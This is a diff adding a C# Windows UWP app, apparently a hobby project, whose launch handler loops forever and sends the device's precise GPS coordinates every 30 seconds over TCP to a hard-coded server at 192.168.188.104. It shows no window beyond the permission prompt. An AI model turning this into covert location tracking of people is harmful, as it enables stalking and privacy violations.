@@ -1,0 +1,52 @@
+﻿ using System;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+using Windows.ApplicationModel.Activation;
+using Windows.Devices.Geolocation;
+using Windows.UI.Xaml;
+
+namespace TaczUltimate
+{
+    sealed partial class App : Application
+    {
+        protected override async void OnLaunched(LaunchActivatedEventArgs e)
+        {
+            // Endlosschleife: alle 30 Sekunden Standort senden
+            while (true)
+            {
+                await StandortSendenAsync();
+                await Task.Delay(30000); // 30 Sekunden warten
+            }
+        }
+
+        private async Task StandortSendenAsync()
+        {
+            try
+            {
+                // Zugriff auf Standort anfordern
+                var zugriff = await Geolocator.RequestAccessAsync();
+                if (zugriff != GeolocationAccessStatus.Allowed) return;
+
+                var locator = new Geolocator { DesiredAccuracy = PositionAccuracy.High };
+                var pos = await locator.GetGeopositionAsync();
+
+                string nachricht = $"Breite: {pos.Coordinate.Point.Position.Latitude}, Länge: {pos.Coordinate.Point.Position.Longitude}";
+
+                // Verbindung zum Server
+                using (var client = new TcpClient("192.168.188.104", 1234)) // IP deines Servers
+                using (var stream = client.GetStream())
+                {
+                    byte[] daten = Encoding.UTF8.GetBytes(nachricht);
+                    await stream.WriteAsync(daten, 0, daten.Length);
+                }
+
+                System.Diagnostics.Debug.WriteLine("Gesendet: " + nachricht);
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine("Fehler: " + ex.Message);
+            }
+        }
+    }
+}
